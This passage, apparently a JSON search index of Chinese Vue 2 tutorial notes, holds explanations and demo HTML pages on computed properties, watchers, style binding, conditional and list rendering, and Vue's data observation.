实现相比，内部有缓存机制（复用），效率更高，调试方便\",\"备注 \",\"计算属性最终会出现在 vm 上，直接读取使用即可\",\"如果计算属性要被修改，那必须写 set 函数去响应修改，且 set 中要引起计算时依赖的数据发生改变\",\"如果计算属性确定不考虑修改，可以使用计算属性的简写形式\",\"我们用计算属性实现姓名案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>计算属性实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{fullName}}</span> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, computed: { //完整写法 /*fullName: { get() { return this.firstName + '-' + this.lastName }, set(value) { const arr = value.split('-') this.firstName = arr[0] this.lastName = arr[1] }, },*/ //简写形式 fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \"]},{\"header\":\"侦听属性\",\"slug\":\"侦听属性\",\"contents\":[]},{\"header\":\"侦听属性基本用法\",\"slug\":\"侦听属性基本用法\",\"contents\":[\"watch 侦听属性\",\"当被侦听的属性变化时，回调函数自动调用，进行相关操作\",\"侦听的属性必须存在，才能进行侦听，既可以侦听 data，也可以侦听计算属性\",\"配置项属性 immediate:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)\",\"侦听有两种写法 \",\"创建 Vue 时传入 watch:{}配置\",\"通过 vm.$watch() 侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听的基本用法</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>今天天气很{{info}}</h2> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true, }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, //方式一 /*watch: { isHot: { immediate: true, handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }, },*/ }) //方式二 vm.$watch('isHot', { immediate: true, //初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时 handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性02.gif\"]},{\"header\":\"深度侦听\",\"slug\":\"深度侦听\",\"contents\":[\"Vue 中的 watch 默认不侦听对象内部值的改变（一层）\",\"在 watch 中配置 deep:true 可以侦听对象内部值的改变（多层）\",\"注意：\",\"Vue 自身可以侦听对象内部值的改变，但 Vue 提供的 watch 默认不可以\",\"使用 watch 时根据侦听数据的具体结构，决定是否采用深度侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>深度侦听</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>a的值是:{{ numbers.a }}</h3> <button @click=\\\"numbers.a++\\\">点我让a+1</button> <h3>b的值是:{{ numbers.b }}</h3> <button @click=\\\"numbers.b++\\\">点我让b+1</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { numbers: { a: 1, b: 1, }, }, watch: { // 监视多级结构中某个属性的变化 /*'numbers.a': { handler() { console.log('a被改变了') }, },*/ //监视多级结构中所有属性的变化 numbers: { deep: true, handler() { console.log('numbers改变了') }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性03.gif\"]},{\"header\":\"侦听属性简写\",\"slug\":\"侦听属性简写\",\"contents\":[\"如果侦听属性除了 handler 没有其他配置项的话，可以进行简写\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听属性简写</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>今天天气很{{ info }}</h3> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, watch: { // 正常写法 // isHot: { // // immediate:true, //初始化时让handler调用一下 // // deep:true, //深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // }, //简写 isHot(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue, this) }, }, }) //正常写法 // vm.$watch('isHot', { // immediate: true, //初始化时让handler调用一下 // deep: true,//深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // })l //简写 // vm.$watch('isHot', (newValue, oldValue) => { // console.log('isHot被修改了', newValue, oldValue, this) // }) </script> </body> </html> \"]},{\"header\":\"计算属性 VS 侦听属性\",\"slug\":\"计算属性-vs-侦听属性\",\"contents\":[\"computed 和 watch 之间的区别：\",\"computed 能完成的功能，watch 都可以完成\",\"watch 能完成的功能，computed 不一定能完成，例如 watch 可以进行异步操作\",\"两个重要的小原则：\",\"所有被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或组件实例对象\",\"所有不被 Vue 所管理的函数（定时器的回调函数、Ajax 的回调函数、Promise 的回调函数等），最好写成箭头函数，这样 this 的指向才是 vm 或组件实例对象\",\"上面的姓名案例：\",\"使用计算属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三' }, computed:{ fullName(){ return this.firstName + '-' + this.lastName } } }) \",\"使用监听属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三', fullName:'张-三' }, watch:{ firstName(val){ setTimeout(()=>{ this.fullName = val + '-' + this.lastName },1000); }, lastName(val){ this.fullName = this.firstName + '-' + val } } }) \"]}]},\"/front-end/vue-notes/07-Vue%E6%A0%B8%E5%BF%83-%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F.html\":{\"title\":\"Vue核心-绑定样式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/07-Vue核心-绑定样式\"]},{\"header\":\"绑定 class 样式\",\"slug\":\"绑定-class-样式\",\"contents\":[\":class=\\\"xxx\\\" //xxx 可以是字符串、数组、对象 \"]},{\"header\":\"字符串写法\",\"slug\":\"字符串写法\",\"contents\":[\"字符串写法适用于：类名不确定，要动态获取\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-字符串写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .happy { border: 4px solid red; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg, yellow, pink, orange, yellow); } .sad { border: 4px dashed rgb(2, 197, 2); background-color: gray; } .normal { background-color: skyblue; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --> <div class=\\\"basic\\\" :class=\\\"mood\\\" @click=\\\"changeMood\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', mood: 'normal', }, methods: { changeMood() { const arr = ['happy', 'sad', 'normal'] const index = Math.floor(Math.random() * 3) this.mood = arr[index] }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式01.gif\"]},{\"header\":\"数组写法\",\"slug\":\"数组写法\",\"contents\":[\"数组写法适用于：要绑定多个样式，个数不确定，名字也不确定\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --> <div class=\\\"basic\\\" :class=\\\"classArr\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classArr: ['zhf1', 'zhf2', 'zhf3'], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式02.png\"]},{\"header\":\"对象写法\",\"slug\":\"对象写法\",\"contents\":[\"对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --> <div class=\\\"basic\\\" :class=\\\"classObj\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classObj: { zhf1: true, zhf2: false, zhf3: true, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式03.png\"]},{\"header\":\"绑定 style 样式\",\"slug\":\"绑定-style-样式\",\"contents\":[\":style=\\\"xxx\\\" \",\"样式对象中的 key，必须是存在的 CSS 属性，如 fontSize、backgroundColor（小驼峰命名法）\"]},{\"header\":\"对象写法\",\"slug\":\"对象写法-1\",\"contents\":[\":style=\\\"对象\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--对象写法 --> <div class=\\\"basic\\\" :style=\\\"styleObj, styleObj2\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleObj: { fontSize: '40px', color: 'red', }, styleObj2: { backgroundColor: 'orange', }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式04.png\"]},{\"header\":\"数组写法\",\"slug\":\"数组写法-1\",\"contents\":[\":style=\\\"数组\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--数组写法 --> <div class=\\\"basic\\\" :style=\\\"styleArr\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleArr: [ { fontSize: '40px', color: 'blue', }, { backgroundColor: 'gray', }, ], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式05.png\"]}]},\"/front-end/vue-notes/08-Vue%E6%A0%B8%E5%BF%83-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93.html\":{\"title\":\"Vue核心-条件渲染\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/08-Vue核心-条件渲染\"]},{\"header\":\"条件渲染\",\"slug\":\"条件渲染\",\"contents\":[\"v-if\",\"写法跟 if else 语法类似 \",\"v-if=\\\"表达式\\\"\",\"v-else-if=\\\"表达式\\\"\",\"v-else\",\"适用于：切换频率较低的场景，因为不展示的 DOM 元素直接被移除\",\"注意：v-if 可以和 v-else-ifv-else 一起使用，但要求结构不能被打断\",\"v-show\",\"写法：v-show=\\\"表达式\\\"\",\"适用于：切换频率较高的场景\",\"特点：不展示的 DOM 元素未被移除，仅仅是使用样式隐藏掉 display:none;\",\"备注：\",\"使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到\",\"template 标签不影响结构，页面 html 中不会有此标签，但只能配合 v-if，不能配合 v-show\",\"例：\",\"v-if\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-if</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-if做条件渲染 --> <h2 v-if=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-if=\\\"1 === 1\\\">欢迎来到{{name}}</h2> <!-- v-else和v-else-if --> <div v-if=\\\"n === 1\\\">A</div> <div v-else-if=\\\"n === 2\\\">B</div> <div v-else-if=\\\"n === 3\\\">C</div> <div v-else>哈哈哈</div> <!-- v-if与template的配合使用 --> <template v-if=\\\"n === 1\\\"> <h3>你好</h3> <h3>QFNU</h3> <h3>曲阜</h3> </template> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染01.gif\",\"v-show\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-show</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是:{{ n }}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-show做条件渲染 --> <h2 v-show=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-show=\\\"n===1\\\">欢迎来到{{name}}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染02.gif\"]}]},\"/front-end/vue-notes/09-Vue%E6%A0%B8%E5%BF%83-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86.html\":{\"title\":\"Vue核心-列表渲染与数据监视\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/09-Vue核心-列表渲染与数据监视\"]},{\"header\":\"列表渲染\",\"slug\":\"列表渲染\",\"contents\":[]},{\"header\":\"基本列表\",\"slug\":\"基本列表\",\"contents\":[\"v-for 指令\",\"用于展示列表数据\",\"语法：<li v-for=\\\"(item, index) of items\\\" :key=\\\"index\\\">，这里 key 可以是 index，更好的是遍历对象的唯一标识，这里的 of 也可以用 in\",\"可遍历：数组、对象、字符串（用的少）、指定次数（用的少）\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>基本列表</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 遍历数组 --> <h3>人员列表（遍历数组）</h3> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\">{{p.name}}-{{p.age}}</li> </ul> <!-- 遍历对象 --> <h3>汽车信息（遍历对象）</h3> <ul> <li v-for=\\\"(value,k) of car\\\" :key=\\\"k\\\">{{k}}-{{value}}</li> </ul> <!-- 遍历字符串 --> <h3>演示遍历字符串（用得少）</h3> <ul> <li v-for=\\\"(char,index) of str\\\" :key=\\\"index\\\">{{char}}-{{index}}</li> </ul> <!-- 遍历指定次数 --> <h3>演示遍历指定次数（用得少）</h3> <ul> <li v-for=\\\"(number,index) of 5\\\" :key=\\\"index\\\"> {{ index }}-{{ number }} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], car: { name: '奥迪', price: '70万', color: '黑色', }, str: 'hello', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视01.png\"]},{\"header\":\"key 的作用与原理\",\"slug\":\"key-的作用与原理\",\"contents\":[\"原理：\",\"Vue核心-列表渲染与数据监视02.jpg\",\"Vue核心-列表渲染与数据监视03.jpg\",\"面试题：react、vue 中的 key 有什么作用？（key 的内部原理）\",\"虚拟 DOM 中 key 的作用：key 是虚拟 DOM 中对象的标识，当数据发生变化时，Vue 会根据新数据生成新的虚拟 DOM，随后 Vue 进行新虚拟 DOM 与旧虚拟 DOM 的差异比较，比较规则如下： \",\"旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key \",\"若虚拟 DOM 中内容没变, 直接使用之前的真实 DOM\",\"若虚拟 DOM 中内容变了, 则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM\",\"旧虚拟 DOM 中未找到与新虚拟 DOM 相同的 key \",\"创建新的真实 DOM，随后渲染到到页面\",\"用 index 作为 key 可能会引发的问题 \",\"若对数据进行逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实 DOM 更新 ==> 界面效果没问题，但效率低\",\"若结构中还包含输入类的 DOM：会产生错误 DOM 更新 ==> 界面有问题\",\"开发中如何选择 key？ \",\"最好使用每条数据的唯一标识作为 key，比如 id、手机号、身份证号、学号等唯一值\",\"如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用 index 作为 key 是没有问题的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>key的原理</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表（遍历数组）</h2> <button @click.once=\\\"add\\\">添加一个老刘</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\"> {{p.name}}-{{p.age}} <input type=\\\"text\\\" /> </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], }, methods: { add() { const p = { id: '004', name: '老刘', age: 40 } this.persons.unshift(p) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视04.gif\"]},{\"header\":\"列表过滤\",\"slug\":\"列表过滤\",\"contents\":[\"可以使用 watch 也可以使用计算属性，使用计算属性更加简单方便一点\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表过滤</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', persons: [ { id: '001', name: '马冬梅', age: 19, sex: '女' }, { id: '002', name: '周冬雨', age: 20, sex: '女' }, { id: '003', name: '周杰伦', age: 21, sex: '男' }, { id: '004', name: '温兆伦', age: 22, sex: '男' }, ], //用watch实现 //filPersons: [], }, //用watch实现 /*watch: { keyWord: { immediate: true, handler(val) { this.filPersons = this.persons.filter((p) => { return p.name.indexOf(val) !== -1 }) }, }, },*/ //用computed实现 computed: { filPersons() { return this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视05.gif\"]},{\"header\":\"列表排序\",\"slug\":\"列表排序\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表排序</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <button @click=\\\"sortType = 2\\\">年龄升序</button> <button @click=\\\"sortType = 1\\\">年龄降序</button> <button @click=\\\"sortType = 0\\\">原顺序</button> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', sortType: 0, //0原顺序，1降序，2升序 persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, computed: { filPersons() { const arr = this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) //判断是否需要排序 if (this.sortType) { arr.sort((p1, p2) => { return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age }) } return arr }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视06.gif\"]},{\"header\":\"Vue 数据监视\",\"slug\":\"vue-数据监视\",\"contents\":[\"更新时的一个问题：this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改 data 数据，Vue 不监听，模板不改变\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>更新时的一个问题</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <button @click=\\\"updateMei\\\">更新马冬梅的信息</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, methods: { updateMei() { // this.persons[0].name = '马老师' //奏效 // this.persons[0].age = 50 //奏效 // this.persons[0].sex = '男' //奏效 // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效 this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男', }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视07.gif\",\"我们先来研究一下 Vue 是如何监测对象里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-对象</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name }}</h2> <h2>学校地址：{{address}}</h2> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"我们打开控制台，由于数据代理，data 中的数据最终会出现在 vm 身上\",\"Vue核心-列表渲染与数据监视08.png\",\"我们复习一下数据代理：\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，其实在这一步之前还有一步，那就是对 data 中的数据进行加工\",\"若没有加工的过程，那么 _data 和 data 中的内容应该就是一模一样的, 而 _data 中内容如下图：\",\"Vue核心-列表渲染与数据监视09.png\",\"所谓加工简单来说就是把 data 中的每一组 key-value 都生成一个 getter 和 setter，那么为什么要加工 data 呢，因为这样可以做响应式：例如当我们修改了 data 中的 name 属性，name 的 setter 就会被调用，在 setter 中调用了一个方法，会重新解析模板，生成新的虚拟 DOM，然后 diff 算法对比，然后更新页面，从而实现对数据的监视\",\"我们来模拟一个数据监视（Vue 中实现的更加完善）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟数据监视</title> </head> <body> <script> let data = { name: '曲阜师范大学', address: '曲阜', } //创建一个监视的实例对象，用于监视data中属性的变化 const obs = new Observer(data) console.log(obs) // 准备一个vm实例对象 let vm = {} vm._data = data = obs function Observer(obj) { // 汇总对象中所有的属性形成一个数组 const keys = Object.keys(obj) console.log(keys) // 遍历 keys.forEach((k) => { Object.defineProperty(this, k, { get() { return obj[k] }, set(val) { console.log( `${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了` ) obj[k] = val }, }) }) } </script> </body> </html> \",\"Observer 构造函数会将 data 中的每个属性都添加到 Observer 实例对象中（通过 defineProperty()），并生成相应的 getter 和 setter，实现对 data 中属性的代理（data 是创建实例时传入的参数）\",\"效果：\",\"Vue核心-列表渲染与数据监视10.png\",\"存在两个问题：\",\"在 Vue 中还对 _data（data） 中的属性进行了代理，可以直接通过 vm.xxx 操作数据，而这里需要通过 vm._data.xxx 来操作数据\",\"只能监测一层数据，如果 data 中有对象，对象中还有属性，就监测不到\",\"下面我们认识一个 API：Vue.set()\",\"首先我们应该知道：读取一个对象中不存在的属性，是 undefined，不报错，如果一个属性值是 undefined，Vue 不会把他展示到页面上\",\"假设需要给某个对象添加一个新的属性（该属性一开始没有定下来，没有在源代码中写，后来随着用户的交互发现需要添加这么一个性别属性），如果直接在 vm._data.某对象 或者 vm 中添加该属性，是做不到响应式的，没有 getter 和 setter 方法，而通过 Vue.set() 或者 vm.$set() 方法，可以做到“后添加的数据也可以实现响应式“\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta 